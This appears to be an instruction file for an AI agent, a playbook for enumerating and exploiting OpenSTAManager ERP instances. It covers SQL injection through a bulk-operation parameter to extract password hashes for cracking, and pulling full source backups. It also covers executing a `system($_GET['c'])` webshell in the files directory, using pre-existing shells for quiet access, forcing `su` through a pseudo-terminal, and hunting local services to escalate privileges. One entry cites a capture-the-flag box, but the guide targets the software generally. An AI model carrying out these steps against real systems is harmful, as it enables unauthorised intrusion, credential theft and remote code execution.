---
name: openstamanager
description: Enumerate and exploit OpenSTAManager instances.
---

# OpenSTAManager testing

Use when an OpenSTAManager (OSM) instance is identified: login page advertises "OpenSTAManager, the open source management software", asset URLs carry `?v=<version>` (e.g. 2.9.8), and app JS defines `globals.rootdir`. OSM is a PHP ERP with a per-module/per-plugin action dispatcher — most exploitation goes through `actions.php` with `id_module`/`id_plugin`/`op` parameters.

## Login and structure

1. POST `/?op=login` with `username`/`password` (no CSRF token). Verify success by `op=logout` appearing in a follow-up GET of `/index.php`.
2. Enumerate modules from the nav HTML of `/index.php`: `href="/controller.php?id_module=N"` with the link text naming each module (14 = Sales invoices, 15 = Purchase invoices, 18 = Scheduled payments, 7 = Backup, 38 = Users and permissions).
3. Plugin ids are per-module and discoverable in module-page JS (`id_plugin=N` near `/plugins/<dir>/...` references) or from the `zz_plugins` table once SQLi is available. Common FE plugins: `importFE` (single XML/P7M upload, module 15), `importFE_ZIP` (ZIP upload, module 14), `receiptFE` (receipts, module 14). Directory names and numeric ids are deployment data — verify, do not assume.

## SQL injection (bulk operations)

The scadenzario bulk handler (module 18, `op=send_reminder`) implodes `id_records[]` POST values unquoted into an `IN (...)` clause: error-based extraction works with the exact payload shape and chunked-read loop in [error-based extraction](references/error-based-extraction.md). `zz_users` holds bcrypt password hashes (`username`, `password` columns) — hand the full 60-char hash to john with rockyou. MySQL settings worth reading: `@@secure_file_priv` (often restricts `LOAD_FILE`/`INTO OUTFILE` to a server-side dir you cannot fetch), and `information_schema.user_privileges` for the connecting user's grants.

## Backup module as source-of-truth artifact

As a user with Backup access (admin), `GET /actions.php?id_module=7&op=backup&exclude=` creates a backup, and `GET /modules/backups/actions.php?op=getfile&number=0` downloads a ZIP of the entire deployed source tree plus the `files/` data directory. Use this to settle any deployed-version or patched-code question (e.g. whether a CVE sink function still lacks `escapeshellarg`) instead of guessing from version strings. The backup also carries the data dir, including plugin import directories and any pre-existing webshells.

## Verified-response discipline

- A 500 response whose body still begins `{"id":1` means the JSON result was emitted and processing continued afterward — the status code alone proves nothing about the failing stage.
- `prepare`/`list` plugin ops that miss their file make an outbound cURL call to the vendor cloud (services.osmcloud.it) and block ~20 s before failing DNS. That fixed delay mimics time-based injection proofs — confirm commands with an observable effect (file artifact, DB row, out-of-band callback), never with response latency.
- Plugin `save` handlers store uploads into one directory while `prepare` reads from another module's import directory; a file you uploaded may exist on disk yet never be processed. When an upload-then-process flow silently does nothing, compare the plugin's save directory against the directory its prepare handler reads (both derivable from `FatturaElettronica::getImportDirectory` arguments in the deployed source from the backup).
- PHP-disabled `files/.htaccess` exists in stock OSM: a webshell dropped in `files/` will not execute under Apache; place executable payloads in the webroot proper.

## .htaccess is only honored by Apache — nginx serves files/ PHP regardless

**Verified 2026-10-11 on proj_009 (enigma.htb):** OSM's `files/.htaccess` (`php_flag engine off`) is an Apache mechanism. When the front-end is nginx (common for OSM deployments), .htaccess is silently ignored and any PHP file under `files/` EXECUTES. A pre-existing `files/SHELL.php` (`<?php system($_GET["c"]); ?>`, dated with the box) ran as www-data at `http://<osm-host>/files/SHELL.php?c=id` despite the .htaccess. Never conclude "PHP disabled in files/" from the presence of .htaccess alone — check which web server fronts the app (response `Server:` header) and test-execute a harmless payload. For argument injection into that webshell, URL-encode the command (`system($_GET["c"])` needs proper quoting; a wrapper script that urlencodes before curl is the reliable pattern).

## Pre-existing webshells and leftover artifacts

Downloaded OSM backups (module 7) may contain files that predate your session (dated at box creation): webshells left by the challenge author or prior testers. Treat every PHP file in `files/` as a candidate execution primitive — `grep -rn "system\|exec\|eval\|shell_exec\|passthru" files/` on the extracted backup. These give instant www-data RCE without needing to upload anything, which is quieter than dropping new files.

## Local-user pivots from www-data

- `su` requires a TTY for the password prompt: from a non-interactive webshell, wrap with `script -qc "echo <password> | su <user> -c '<command>'" /dev/null` (util-linux script allocates the pty). Verified: www-data → haris pivot for reading `/home/<user>/user.txt` (mode 0640 root:user).
- `config.inc.php` in the OSM webroot holds the MySQL credentials (db user/password) — useful for DB-level pivots and often reused elsewhere.
- Loopback-only services (admin panels, job runners on 127.0.0.1) reachable from the compromised web user are the standard privesc hunt: enumerate with `ss -tlnp` / try common ports from the shell. A local firewall may allow one system user (e.g. a human account) but block www-data — if a port times out for www-data, retry as the pivoted user before declaring it closed.
